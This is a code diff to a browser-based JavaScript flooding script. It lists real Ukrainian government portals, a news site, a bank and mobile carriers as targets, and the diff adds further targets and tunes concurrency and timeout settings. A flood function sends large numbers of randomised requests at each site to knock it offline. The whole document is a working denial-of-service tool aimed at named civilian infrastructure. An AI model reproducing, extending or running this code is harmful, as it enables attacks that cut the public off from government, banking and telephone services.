@@ -1,11 +1,15 @@
 try {
 var targets = {
         'https://diia.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },
-        // 'https://www.ubr.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },
+        'https://www.ubr.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },
         'http://cis.org.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },
         'http://www.mns.gov.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },
         'http://dpsu.gov.ua/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
         'http://www.apn-ua.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
+        'http://privatbank.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },
+        'https://kyivstar.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },
+        'https://www.vodafone.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },
+        'https://www.lifecell.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },
         'https://ukraine.ua/': { number_of_requests: 0, number_of_errored_responses: 0 }
     }
   
@@ -14,9 +18,9 @@ var targets = {
 function printStats() {
     statsEl.innerHTML = '<pre>' + JSON.stringify(targets, null, 2) + '</pre>'
 }
-setInterval(printStats, 1);
+setInterval(printStats, 5);
 
-var CONCURRENCY_LIMIT = 500;
+var CONCURRENCY_LIMIT = 125;
 var queue = [];
 
 async function fetchWithTimeout(resource, options) {
@@ -41,7 +45,7 @@ async function flood(target) {
         rand = i % 13 === 0 ? '' : ('?' + Math.floor(Math.random() * 2800))
         queue.push(
             fetchWithTimeout(target + rand, {
-                timeout: 5000
+                timeout: 4000
             })
             .catch((error) => {
                 if (error.code === 20 /* ABORT */ ) {
